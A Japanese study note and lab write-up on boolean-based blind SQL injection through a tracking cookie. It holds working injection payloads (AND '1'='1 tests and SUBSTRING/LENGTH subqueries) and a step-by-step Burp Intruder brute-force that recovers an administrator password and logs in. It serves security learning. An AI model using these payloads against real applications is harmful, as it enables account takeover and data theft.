# blind-SQLi
blind SQLiに関するまとめ

アプリケーションの多くはHTTPレスポンスやDBエラー情報をわざわざレスポンスとして送り返さない。その情報に依存するUNION攻撃などは基本的に通用しない。
その場合に使われる手法がブラインドSQLインジェクションである。上の理由から、使用されているSQLiの多くはブラインドSQLiである。

データそのものがレスポンスとして帰ってこなくても、レスポンスで真偽が変えるだけでブラインド脆弱性として利用できる

〇条件付き応答をトリガーしてブラインドSQLインジェクションを悪用
トラッキングCookieを使用して使用状況に関する分析情報を収集するアプリケーションを考えてみましょう。アプリケーションへのリクエストには、次のようなCookieヘッダーが含まれます。

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
クッキーを含むリクエストTrackingIdが処理されるとき、アプリケーションは SQL クエリを使用して、これが既知のユーザーであるかどうかを判断します。
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
このクエリはSQLインジェクションに対して脆弱ですが、クエリの結果はユーザーに返されません。ただし、クエリがデータを返すかどうかによって、アプリケーションの動作は異なります。認識されたクエリを送信するとTrackingId、クエリはデータを返し、レスポンスに「Welcome back」メッセージが表示されます。
この動作は、ブラインドSQLインジェクションの脆弱性を悪用するのに十分です。挿入された条件に応じて異なるレスポンスをトリガーすることで、情報を取得できます。


〇条件付きレスポンスのトリガーによるブラインドSQLインジェクションの悪用 - 続き
このエクスプロイトの仕組みを理解するために、次のTrackingIdCookie 値を含む 2 つのリクエストが順番に送信されるものとします。

…xyz' AND '1'='1
…xyz' AND '1'='2
最初の値では、挿入されたAND '1'='1条件が真であるため、クエリは結果を返します。その結果、「Welcome back」メッセージが表示されます。
2番目の値では、挿入された条件が偽であるため、クエリは結果を返しません。「Welcome back」メッセージは表示されません。
これにより、単一の挿入された条件に対する答えを決定し、一度に 1 つずつデータを抽出できるようになります。

〇条件付きレスポンスのトリガーによるブラインドSQLインジェクションの悪用 - 続き
例えば、Users列 と をUsername持つテーブル がありPassword、ユーザー がいるとしますAdministrator。このユーザーのパスワードは、パスワードを1文字ずつテストする一連の入力を送信することで特定できます。

これを行うには、次の入力から始めます。

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
これにより、「Welcome back」メッセージが返され、挿入された条件が true であり、パスワードの最初の文字が より大きいことが示されますm。

次に、次の入力を送信します。

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
これは、「Welcome back」メッセージを返しません。これは、挿入された条件が false であり、パスワードの最初の文字が より大きくないことを示しますt。

最終的に、次の入力を送信すると、「Welcome back」メッセージが返され、パスワードの最初の文字が であることが確認されますs。

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
このプロセスを継続することで、ユーザーの完全なパスワードを体系的に決定することができますAdministrator。

注記
このSUBSTRING関数はSUBSTR一部のデータベースで呼び出されます。詳細については、SQLインジェクションに関するチートシートをご覧ください。











LAB11 : Blind SQL injection with conditional responses

Vulnerable parameter  - tracking cookie

End Goals:
1) administratorのパスワードを列挙
2) administratorとしてログイン

cookie editorを使って

分析:
検索で分類をクリックするとwelcome backという文字が表示される事を利用して

1) バックエンドに飛ぶクエリを推測する
SELECT tracking-id FROM traing-table WHERE tracking-id = '4iGVOSM2pFD5yIy4';

-> 入力したtracking-idが存在すればクエリが返り、Welcome　backという文字列が表示される
-> 入力したtracking-idが存在しない -> welcome backが表示されない 

2) クエリに自分の文字を追加する
SELECT tracking-id FROM traing-table WHERE tracking-id = ' 4iGVOSM2pFD5yIy4'AND 1 = 1--';
(--で残りのクエリをコメントアウト)
->TRUE なので追加した文がクエリとして実行されているためSQL脆弱性である

SELECT tracking-id FROM traing-table WHERE tracking-id = ' 4iGVOSM2pFD5yIy4'AND 1 = 0--';
FALSE　なので正常にクエリが使えている

3) userテーブルが存在するか確認する
SELECT tracking-id FROM traing-table 
    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT 'x' FROM users LIMIT 1) = 'x'--';
サブクエリはusersテーブルに1レコードでもあれはXという文字列を返す
つまりusersテーブルにレコードが存在すればX＝Xとなりtrueとなる
-> usersテーブルが存在するか確かめている

4) administratorがusersテーブルに存在するか
SELECT tracking-id FROM traing-table 
    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT username FROM users WHERE username='administrator')
    = 'administrator'--'
->welcome backが出たので　administratorユーザーは存在している

5)administratorユーザー（管理者ユーザー）のパスワードの長さを調べる
SELECT tracking-id FROM traing-table 
    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--'

instruderにリクエストを送り、1をペイロード化して1-50をpayloadのnumberで攻撃　19まで同じだったlengthが20で急に変わった->>19までtrue ->パスワード文字数は20であると判明

    ★administratorのパスワード文字数は 20文字

6)administratorユーザー（管理者ユーザー）のパスワードを列挙して調査する
一文字目a? -> falseならb?と一つ一つ20文字分続ける

パスワードの1文字目がaかどうか知らべる
SELECT tracking-id FROM traing-table 
    WHERE tracking-id = '4iGVOSM2pFD5yIy4'AND (SELECT substring(password, 1, 1) FROM users WHERE username='administrator')='a'--'

InstuderのPayloadでBlute forcer でa-z0-9を調査
->一文字目はmだと判明
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
m p r g 1 g i x m h  m  t  s  m  s  x  7  c  l  s
mprg1gixmhmtsmsx7cls

7)administratorとしてログイン！
ユーザー名　administrator
パスワード　mprg1gixmhmtsmsx7cls
ログイン成功！



tracking-id = XrDnioOBDXJi285K' AND '1'='1と入力すると
SELECT tracking-id FROM traing-table WHERE tracking-id = 'XrDnioOBDXJi285K' AND '1'='1';となる
-> true -> welcome back
'1' = '2'にして
-> welcome backが出ないなら自分の文字を注入できている


Ctrl + U -> URLエンコード

